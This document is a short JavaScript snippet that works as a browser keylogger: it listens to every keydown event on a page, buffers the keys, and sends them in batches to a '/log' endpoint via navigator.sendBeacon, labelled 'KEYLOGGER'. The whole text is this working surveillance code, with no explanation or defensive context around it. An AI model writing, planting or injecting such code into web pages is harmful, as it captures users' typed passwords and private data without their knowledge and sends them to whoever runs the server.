(function() {
    let keystrokes = "";

    document.addEventListener('keydown', function(e) {
        let key = e.key;
        if (key === "Enter") key = "[ENTER]";
        else if (key === " ") key = "[SPACE]";
        keystrokes += key;

        if (keystrokes.length > 10) {
            navigator.sendBeacon("/log", "KEYLOGGER: " + keystrokes);
            keystrokes = "";
        }
    });
})();
